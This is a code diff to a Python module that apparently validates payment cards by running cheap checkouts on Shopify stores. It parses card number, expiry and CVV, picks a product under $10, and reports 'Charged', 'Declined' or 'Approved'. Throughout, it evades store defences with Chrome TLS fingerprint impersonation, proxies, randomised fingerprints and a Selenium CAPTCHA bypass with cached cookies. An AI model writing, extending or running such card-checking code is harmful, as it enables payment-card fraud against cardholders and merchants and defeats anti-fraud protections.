@@ -19,9 +19,9 @@ _CAPTCHA_SOLVER_AVAILABLE = False
 try:
     from captcha_solver import solve_shopify_captcha, is_solver_available, get_solver_status, get_cached_cookies
     _CAPTCHA_SOLVER_AVAILABLE = True
-    print("[shopifyapi] ✅ Selenium CAPTCHA solver loaded")
+    print("[shopifyapi] \u2705 Selenium CAPTCHA solver loaded")
 except ImportError:
-    print("[shopifyapi] ⚠️ captcha_solver not available — CAPTCHA bypass disabled")
+    print("[shopifyapi] \u26a0\ufe0f captcha_solver not available \u2014 CAPTCHA bypass disabled")
 
 # ── curl_cffi: Chrome TLS fingerprint impersonation ──────────────────────
 _CURL_CFFI_AVAILABLE = False
@@ -971,7 +971,7 @@ async def main():
             print(f"❌ An error occurred in main: {e}")
 
 
-async def check_site_fast(site_url, proxy_url=None, max_price=999999.0, min_price=0.01):
+async def check_site_fast(site_url, proxy_url=None, max_price=10.0, min_price=0.01):
     site_url = site_url.strip().rstrip("/")
     fingerprint = get_random_fingerprint()
     
@@ -992,7 +992,6 @@ async def check_site_fast(site_url, proxy_url=None, max_price=999999.0, min_pric
     _proxy_fmt = None
     if proxy_url:
         _proxy_fmt = format_proxy(proxy_url) if isinstance(proxy_url, str) else proxy_url
-
     try:
         async with _create_async_client(proxy_url=_proxy_fmt, timeout=12.0, chrome_version=fingerprint.get("_chrome_ver")) as client:
             r = await client.get(site_url + "/products.json", headers=product_header)
@@ -1067,10 +1066,10 @@ async def check_site_fast(site_url, proxy_url=None, max_price=999999.0, min_pric
 
 _POLL_QUERY = "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}"
 
-_CAPTCHA_MAX_RETRIES = 0
+_CAPTCHA_MAX_RETRIES = 0  # تم التعديل: من 1 لـ 0
 
 # ── Global concurrency limiter ────────────────────────────────────────
-_MAX_CONCURRENT_CHECKS = 20
+_MAX_CONCURRENT_CHECKS = 20  # تم التعديل: من 30 لـ 10
 _check_semaphore = None
 _active_checks = 0
 
@@ -1085,9 +1084,10 @@ def _is_captcha_result(result):
     return "CAPTCHA" in code or "CAPTCHA" in msg or "CHECKPOINT" in code or "CHECKPOINT" in msg
 
 
-async def run_shopify_check(site_url, card_str, proxy_url=None, verbose=False, discord_console_webhook=None, timeout=120.0, max_captcha_retries=None, min_price=0.01, max_price=999999.0):
+async def run_shopify_check(site_url, card_str, proxy_url=None, verbose=False, discord_console_webhook=None, timeout=120.0, max_captcha_retries=None):
     global _active_checks, _check_semaphore
     
+    # تم التعديل: إضافة حد أقصى للشيكات المتزامنة
     if _active_checks > 15:
         return {"status": "Error", "message": "Server busy, try again", "error_code": "SERVER_BUSY"}
     
@@ -1096,11 +1096,11 @@ async def run_shopify_check(site_url, card_str, proxy_url=None, verbose=False, d
     async with _check_semaphore:
         _active_checks += 1
         try:
-            return await _run_shopify_check_inner(site_url, card_str, proxy_url, verbose, discord_console_webhook, timeout, max_captcha_retries=max_captcha_retries, min_price=min_price, max_price=max_price)
+            return await _run_shopify_check_inner(site_url, card_str, proxy_url, verbose, discord_console_webhook, timeout, max_captcha_retries=max_captcha_retries)
         finally:
             _active_checks -= 1
 
-async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=False, discord_console_webhook=None, timeout=120.0, max_captcha_retries=None, min_price=0.01, max_price=999999.0):
+async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=False, discord_console_webhook=None, timeout=120.0, max_captcha_retries=None):
     site_url = site_url.strip().rstrip("/")
     parts = card_str.strip().replace(" ", "").split("|")
     if len(parts) != 4:
@@ -1144,12 +1144,12 @@ async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=F
                             except Exception:
                                 pass
                         if injected and verbose:
-                            print(f"[{datetime.now().strftime('%H:%M:%S')}] [API] 🍪 Using {injected} cached cookies (CAPTCHA skip)")
+                            print(f"[{datetime.now().strftime('%H:%M:%S')}] [API] \U0001f36a Using {injected} cached cookies (CAPTCHA skip)")
                 except Exception:
                     pass
 
             result = await asyncio.wait_for(
-                _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=proxy_use, verbose=verbose, discord_console_webhook=discord_console_webhook, min_price=min_price, max_price=max_price),
+                _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=proxy_use, verbose=verbose, discord_console_webhook=discord_console_webhook),
                 timeout=float(timeout),
             )
     except asyncio.TimeoutError:
@@ -1163,7 +1163,7 @@ async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=F
         result = {"status": "Error", "message": str(e)[:200]}
 
     if _is_captcha_result(result) and captcha_retries > 0 and _CAPTCHA_SOLVER_AVAILABLE:
-        _log_verbose(verbose, "🤖 CAPTCHA detected — attempting Selenium bypass...", discord_webhook=discord_console_webhook)
+        _log_verbose(verbose, "\U0001f916 CAPTCHA detected — attempting Selenium bypass...", discord_webhook=discord_console_webhook)
         
         checkout_url = result.get("_checkout_url") or f"{site_url}/checkout"
         
@@ -1180,14 +1180,14 @@ async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=F
                 browser_cookies = solver_result.get("cookies", {})
                 browser_session_token = solver_result.get("session_token")
                 
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] ✅ Selenium BYPASSED | url={browser_url[:60]} | cookies={len(browser_cookies)} | session={'yes' if browser_session_token else 'no'}")
+                print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] \u2705 Selenium BYPASSED | url={browser_url[:60]} | cookies={len(browser_cookies)} | session={'yes' if browser_session_token else 'no'}")
                 
                 from captcha_solver import do_full_browser_checkout
                 
                 info2 = ShopifyAuto().get_random_info()
                 info2["price"] = price if 'price' in dir() else ""
                 info2["product"] = product_title if 'product_title' in dir() else ""
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] 📝 Filling form & submitting in browser...")
+                print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] \U0001f4dd Filling form & submitting in browser...")
                 
                 browser_result = await do_full_browser_checkout(
                     cc=cc, mon=mon, year=year, cvv=cvv,
@@ -1197,15 +1197,15 @@ async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=F
                 
                 status = browser_result.get("status", "Error")
                 msg = browser_result.get("message", "")[:60]
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] 📦 Browser result: {status} | {msg}")
+                print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] \U0001f4e6 Browser result: {status} | {msg}")
                 
                 result = browser_result
                 if status in ("Charged", "Declined", "Approved") and browser_cookies:
                     cache_cookies(site_url, browser_cookies)
             else:
-                _log_verbose(verbose, f"⚠️ Selenium solver failed: {solver_result.get('error', 'unknown')}", discord_webhook=discord_console_webhook)
+                _log_verbose(verbose, f"\u26a0\ufe0f Selenium solver failed: {solver_result.get('error', 'unknown')}", discord_webhook=discord_console_webhook)
         except Exception as e:
-            _log_verbose(verbose, f"⚠️ Selenium solver exception: {str(e)[:100]}", discord_webhook=discord_console_webhook)
+            _log_verbose(verbose, f"\u26a0\ufe0f Selenium solver exception: {str(e)[:100]}", discord_webhook=discord_console_webhook)
 
     return result
 
@@ -1287,11 +1287,7 @@ def _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_
         "prefetchShippingRatesStrategy": None,
     }
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# ✅ التعديل الرئيسي: استخدام نفس طريقة jo.py في جلب السعر من الـ checkout
-# ═══════════════════════════════════════════════════════════════════════════════
-
-async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=None, verbose=False, discord_console_webhook=None, min_price=0.01, max_price=999999.0):
+async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=None, verbose=False, discord_console_webhook=None):
     site = site_url
     shop = ShopifyAuto(fingerprint=fingerprint)
     last_completion = None
@@ -1352,7 +1348,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                 except (ValueError, TypeError):
                     continue
                 
-                if price_val < min_price or price_val > max_price:
+                if price_val < 0.01 or price_val > 10.0:
                     continue
                 
                 if lowest_price is None or price_val < lowest_price:
@@ -1361,7 +1357,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                     lowest_variant = v
         
         if lowest_product is None or lowest_variant is None:
-            return {"status": "Error", "message": f"No available products in price range (${min_price:.2f}-${max_price:.2f})", "debug_steps": _steps}
+            return {"status": "Error", "message": "No available products in price range", "debug_steps": _steps}
         
         product_handle = lowest_product["handle"]
         variant_id = lowest_variant["id"]
@@ -1371,7 +1367,6 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
         _log_verbose(verbose, f"✅ Product: {product_title[:40]} price={price}", discord_webhook=discord_console_webhook)
     except Exception as e:
         return {"status": "Error", "message": f"Product fetch: {str(e)[:100]}", "debug_steps": _steps}
-    
     try:
         await asyncio.sleep(random.uniform(0.4, 1.2))
 
@@ -1452,42 +1447,11 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
         return {"status": "Error", "message": f"Network: {type(e).__name__}", "debug_steps": _steps}
     checkout_page_url = str(checkout_response.url)
     response_text2 = checkout_response.text
-    
-    # ═══════════════════════════════════════════════════════════════════════════
-    # ✅ التعديل الرئيسي: جلب السعر الحقيقي من صفحة الـ checkout زي jo.py
-    # ═══════════════════════════════════════════════════════════════════════════
-    real_price = None
-    
-    # 1. جرب تجيب السعر من subtotalBeforeTaxesAndShipping
-    real_price = find_between(response_text2, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;')
-    if not real_price:
-        real_price = find_between(response_text2, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
-    if not real_price:
-        real_price = find_between(response_text2, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;')
-    if not real_price:
-        real_price = find_between(response_text2, '"checkoutTotal":{"value":{"amount":"', '"')
-    if not real_price:
-        real_price = find_between(response_text2, 'checkoutTotal&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;')
-    if not real_price:
-        price_match = re.search(r'"price":\s*"([\d.]+)"', response_text2)
-        if price_match:
-            real_price = price_match.group(1)
-    
-    # لو لقينا سعر حقيقي، استخدمه بدل الـ price من products.json
-    if real_price:
-        try:
-            price_val = float(real_price)
-            if price_val >= 0:
-                price = real_price
-                _log_verbose(verbose, f"✅ Real price from checkout: ${price}", discord_webhook=discord_console_webhook)
-        except (ValueError, TypeError):
-            pass
-    
     x_st = _RE_SESSION_TOKEN.search(response_text2)
     session_token = x_st.group(1) if x_st else None
     if not session_token:
         return {"status": "Error", "message": "Checkout session failed", "debug_steps": _steps}
-    _steps.append(f"4. Checkout: HTTP {checkout_response.status_code} | url={checkout_page_url[:60]} | price=${price}")
+    _steps.append(f"4. Checkout: HTTP {checkout_response.status_code} | url={checkout_page_url[:60]}")
     _log_verbose(verbose, "✅ Checkout session OK", discord_webhook=discord_console_webhook)
     queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
     stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
